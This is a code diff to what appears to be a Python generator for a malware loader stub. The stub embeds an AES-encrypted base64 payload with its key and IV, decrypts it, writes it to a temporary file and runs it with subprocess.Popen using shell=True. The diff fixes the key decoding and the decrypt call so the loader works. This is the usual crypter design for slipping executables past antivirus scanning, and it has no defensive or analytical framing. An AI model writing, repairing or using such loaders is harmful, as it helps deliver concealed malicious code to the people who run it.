@@ -28,8 +28,8 @@ import tempfile
 import subprocess
 
 encrypted_payload = "{encrypted_b64}"
-AES_KEY = {base64.b64encode(AES_KEY).decode()}
-IV = {base64.b64encode(IV).decode()}
+AES_KEY = base64.b64decode("{base64.b64encode(AES_KEY).decode()}")
+IV = base64.b64decode("{base64.b64encode(IV).decode()}")
 
 def decrypt_payload(enc_payload, key, iv):
     cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -44,7 +44,7 @@ def execute_payload(payload):
     subprocess.Popen(path, shell=True)
     
 if __name__ == "__main__":
-    payload = decrypt_payload(AES_KEY, AES_KEY, IV)
+    payload = decrypt_payload(encrypted_payload,AES_KEY, IV)
     execute_payload(payload)
 """
 
